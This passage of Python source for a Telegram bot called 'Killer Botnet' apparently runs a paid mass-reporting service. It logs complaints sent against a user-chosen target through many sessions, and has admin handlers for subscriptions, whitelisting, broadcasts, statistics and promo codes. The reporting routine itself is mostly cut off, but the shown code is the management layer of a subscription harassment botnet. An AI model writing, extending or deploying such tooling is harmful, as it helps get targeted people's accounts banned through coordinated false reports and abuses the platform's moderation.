                         f"🩸 Не успешно отправлены: {failed_sessions}", parse_mode="HTML")

        # Уведомляем об отправке в лог-чат
        
    await home(message)
    button = types.InlineKeyboardMarkup(row_width=1)
    sender = types.InlineKeyboardButton(text=f"{message.from_user.id}", url=f"tg://openmessage?user_id={message.from_user.id}")
    button.add(sender)

    await bot.send_message(log_chat_id, f"<b>📬 Жалоба отправлена!\n\nОтправитель: id {message.from_user.id}\nЦель: {message.text}\nУспешно сесий: {successful_sessions}\nНеудачно сесий: {failed_sessions}</b>", reply_markup=button, parse_mode="HTML", disable_web_page_preview=True)

        # Обновляем тайм-аут пользователя в базе данных

@dp.message_handler(commands=['adm'])
async def admin_panel(message: types.Message):
	if int(message.chat.id) not in admin:
		return
		
	if message.from_user.id != message.chat.id:
		return
		
		
	markup = types.InlineKeyboardMarkup(row_width=1)
	send_sub = types.InlineKeyboardButton("🩸 Выдать подписку", callback_data='send1_sub')
	white = types.InlineKeyboardButton("🩸 Добавить вайт-лист", callback_data='white')
	delete = types.InlineKeyboardButton("🩸 Забрать подписку", callback_data='delete')
	spam = types.InlineKeyboardButton("🩸 Рассылка", callback_data='spam')
	stat = types.InlineKeyboardButton("🩸 Статистика Сессий", callback_data='stata')
	state = types.InlineKeyboardButton("🩸 Статистика Людей", callback_data='stats')
	
	
	
	markup.add(send_sub, white, delete, spam, stat, state)
		
	await bot.send_message(message.chat.id, "<b>❄️ Админ панель:</b>", reply_markup=markup, parse_mode="HTML")
	
	
@dp.callback_query_handler(lambda call: call.data == 'stats')
async def stats2(call: types.CallbackQuery, state: FSMContext):
    total_users, subscribed_users = await get_user_counts()
    await bot.send_message(call.from_user.id, 
                           f"<b>❄️ Killer Botnet\n❄️ Количество пользователей: {total_users}\n❄️ Пользователи с подпиской: {subscribed_users}</b>", 
                           parse_mode='HTML')


@dp.callback_query_handler(lambda call: call.data == 'stata')
async def stats(call: types.CallbackQuery, state: FSMContext):
	await infor(call.message)
		

async def send_message_to_users(text):
    async with aiosqlite.connect('database.db') as conn:
        cursor = await conn.cursor()
        await cursor.execute('SELECT user_id FROM users')
        rows = await cursor.fetchall()

        for row in rows:
            user_id = row[0]
            try:
                await bot.send_message(user_id, text)
            except Exception:
                pass

@dp.callback_query_handler(lambda call: call.data == 'spam')
async def spaml2(call: types.CallbackQuery, state: FSMContext):
	await bot.send_message(call.from_user.id, "<b>🔎 Введите текст для рассылки: </b>", parse_mode="HTML")
	await GiveSubState.Spam.set()
	
	
	
@dp.message_handler(state=GiveSubState.Spam)
async def spamchok(message: types.Message, state: FSMContext):
    try:
        await send_message_to_users(message.text)
        await message.answer("<b>✅️ Рассылка произошла успешно!</b>", parse_mode="HTML")
        await state.finish()
        await admin_panel(message)
    except:
        await message.answer("<b>❌️ Ошибка во время рассылки!</b>", parse_mode="HTML")
        await state.finish()
        await admin_panel(message)

@dp.callback_query_handler(lambda call: call.data == 'delete')
async def zeros2(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<b>🩸 Введите айди человека, у которого хотите забрать подписку:</b>", parse_mode="HTML")
    await MyState.delete.set()




async def get_user_counts():
    async with aiosqlite.connect('database.db') as conn:
        cursor = await conn.cursor()

        await cursor.execute('SELECT COUNT(*) FROM users')
        total_users = (await cursor.fetchone())[0]

        await cursor.execute('SELECT COUNT(*) FROM subscriptions')
        subscribed_users = (await cursor.fetchone())[0]

    return total_users, subscribed_users


@dp.message_handler(state=MyState.delete)
async def processing(message: types.Message, state: FSMContext):
    async with aiosqlite.connect('database.db') as conn:
        cursor = await conn.cursor()

        user_id = message.text.strip()

        if not user_id.isdigit():
            await message.answer("<b>❌️ Пожалуйста, введите корректный ID.</b>", parse_mode="HTML")
            await state.finish()
            await home(message)  
            return

        user_id = int(user_id)

        if user_id in admin and (user_id != 7381899082):
            await message.answer("<b>❌️ У вас недостаточно прав!</b>", parse_mode="HTML")
            await state.finish()
            await home(message)  
            return
        
        try:
            await cursor.execute("DELETE FROM subscriptions WHERE user_id = ?", (user_id,))
            await conn.commit()
            
            await message.answer("<b>✅ Подписка успешно убрана!</b>", parse_mode="HTML")
            await state.finish()
            await asyncio.sleep(0.1)
            await home(message)  
            
        except Exception as e:
            print(f"Ошибка: {e}")  
            await message.answer("<b>❌️ Данного пользователя нет в базе данных.</b>", parse_mode="HTML")
            await state.finish()
            await home(message)
	
	


    
@dp.callback_query_handler(lambda call: call.data == 'send1_sub')
async def sub(call: types.CallbackQuery, state: FSMContext):
	await bot.send_message(call.from_user.id, "<b>✍ Укажите ID пользователя и кол-во дней через пробел:</b>", parse_mode="HTML")
	await GiveSubState.WaitingForUserData.set()
	

@dp.message_handler(state=GiveSubState.WaitingForUserData)
async def process_subscription_data(message: types.Message, state: FSMContext):
    if message.text:
        data = message.text.split(' ')

        async with aiosqlite.connect('database.db') as conn:
            cursor = await conn.cursor()
            await cursor.execute("SELECT expiration_date FROM subscriptions WHERE user_id=?", (int(data[0]),))
            try:
                subu = await cursor.fetchone()
                sub = subu[0]
                subcribe = datetime.strptime(sub, '%Y-%m-%d %H:%M:%S.%f')
            except Exception:
                subcribe = datetime.now()
            
            try:
                expiration_date = subcribe + timedelta(days=int(data[1]))
            except Exception:
                pass
            
            try:
                await add_subscription(data[0], expiration_date)
            except Exception:
                await state.finish()
                await message.answer("<b>🤖 Ошибка! Не удалось выдать подписку, убедитесь что указали данные при выдачи подписки верные.</b>", parse_mode="HTML")
                await admin_panel(message)
                return
            
            user_id = int(data[0])
            
            try:
                await bot.send_message(
                    user_id, 
                    f"<b>✅ Вам выдана подписка на {data[1]} дней.\nПропишите /start чтобы подписка была активирована</b>", 
                    parse_mode='HTML'
                )
                await bot.send_message(
                    log_chat_id, 
                    f"🤖 <a href='tg://openmessage?user_id={message.from_user.id}'>Администратор</a> <b>выдал подписку!</b>\n"
                    f"<b>Получатель (id): {user_id}</b>\n"
                    f"<b>Длительность подписки до: {expiration_date}</b>\n"
                    f"<b>Айди администратора: {message.from_user.id}</b>\n"
                    f"<b>Количество дней: {data[1]}</b>", 
                    parse_mode="HTML"
                )
                await message.reply("<b>🩸 Подписка выдана успешно!</b>", parse_mode="HTML")
                await admin_panel(message)
                
            except Exception:
                await bot.send_message(
                    message.from_user.id, 
                    "<b>🖐 Данного пользователя не найдено! Возможно его нет в базе либо он заблокировал бота!</b>", 
                    parse_mode="HTML"
                )
                await admin_panel(message)
                await state.finish()
                return
            
            await state.finish()
        
      
        




async def add_subscription(user_id, expiration_date):
    try:
        async with aiosqlite.connect('database.db') as conn:
            async with conn.cursor() as cursor:
                await cursor.execute(
                    "INSERT OR REPLACE INTO subscriptions (user_id, expiration_date) VALUES (?, ?)",
                    (user_id, expiration_date)
                )
                await conn.commit()
    except sqlite3.Error as db_error:
        raise Exception(f"Ошибка базы данных при добавлении подписки: {db_error}")
	
	
@dp.callback_query_handler(lambda call: call.data == 'white')
async def sub2(call: types.CallbackQuery, state: FSMContext):
	await bot.send_message(call.from_user.id, "<b>✍ Укажите ID пользователя / канала для внесения  в белый лист:</b>", parse_mode="HTML")
	await GiveSubState.White.set()
	



@dp.message_handler(state=GiveSubState.White)
async def proccess_whitelist(message: types.Message, state: FSMContext):
    text = message.text.split()
    
    async with aiosqlite.connect('database.db') as conn:
        cursor = await conn.cursor()

        if len(text) > 1:
            await bot.send_message(message.from_user.id, "<b>❌️ Укажите только ID!</b>", parse_mode="HTML")
            await admin_panel(message)
            await state.finish()
            return

        try:
            user_id = int(text[0]) 
            
            await cursor.execute(
                "INSERT OR REPLACE INTO users (user_id, white_list) VALUES (?, ?)",
                (user_id, "yes")
            )
            await conn.commit()  

            await bot.send_message(message.from_user.id, "<b>✅ Пользователь добавлен в белый список.</b>", parse_mode="HTML")
        except ValueError:
            await bot.send_message(message.from_user.id, "<b>❌ Неверный формат ID. Пожалуйста, введите число.</b>", parse_mode="HTML")
        except Exception as e:
            await bot.send_message(message.from_user.id, f"<b>❌ Ошибка: {e}</b>", parse_mode="HTML")
        
        await state.finish()
        await admin_panel(message)
    
		


@dp.message_handler(commands=['genpromo'])
async def promo_set(message: types.Message):
    user_id = message.from_user.id
    if int(user_id) not in admin:
        return
    
    text = message.text.split(" ")
    promo_code = text[1]
    days = text[2]
    max_activations = text[3]
    
    
    async with aiosqlite.connect('database.db') as conn:
        cursor = await conn.cursor()
        
        try:
            
            await cursor.execute(
                "INSERT INTO promocodes (code, days_subscription, max_activations) VALUES (?, ?, ?)", 
                (str(promo_code), int(days), int(max_activations))
            )
            await conn.commit()  
            
            await message.answer("<b>🔑 Промокод успешно создан!</b>", parse_mode="HTML")
            await home(message)
        except aiosqlite.IntegrityError:
            await message.answer("<b>❌ Промокод с таким кодом уже существует!</b>", parse_mode="HTML")
        except Exception as e:
            await message.answer(f"Ошибка при создании промокода: {e}")
        
	
if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
	
